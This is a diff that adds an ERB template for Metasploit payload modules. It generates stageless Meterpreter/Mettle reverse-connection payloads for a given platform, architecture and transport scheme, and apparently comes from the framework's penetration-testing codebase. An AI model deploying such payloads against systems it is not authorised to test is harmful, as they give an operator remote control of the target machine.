@@ -1,0 +1,44 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core/handler/reverse_<%= scheme %>'
+require 'msf/base/sessions/meterpreter_options'
+require 'msf/base/sessions/mettle_config'
+require 'msf/base/sessions/meterpreter_<%= arch %>_<%= platform.downcase %>'
+
+module MetasploitModule
+
+  include Msf::Payload::Single
+  include Msf::Sessions::MeterpreterOptions
+  include Msf::Sessions::MettleConfig
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name'          => '<%= platform %> Meterpreter, Reverse <%= scheme.upcase %> Inline',
+        'Description'   => 'Run the Meterpreter / Mettle server payload (stageless)',
+        'Author'        => [
+          'Adam Cammack <adam_cammack[at]rapid7.com>',
+          'Brent Cook <brent_cook[at]rapid7.com>',
+          'timwr'
+        ],
+        'Platform'      => '<%= platform.downcase %>',
+        'Arch'          => ARCH_<%= arch.upcase %>,
+        'License'       => MSF_LICENSE,
+        'Handler'       => Msf::Handler::Reverse<%= scheme.capitalize %>,
+        'Session'       => Msf::Sessions::Meterpreter_<%= arch %>_<%= platform %>
+      )
+    )
+  end
+
+  def generate
+    opts = {
+      scheme: '<%= scheme %>',
+      stageless: true
+    }
+    MetasploitPayloads::Mettle.new('<%= payload %>', generate_config(opts)).to_binary :exec
+  end
+end
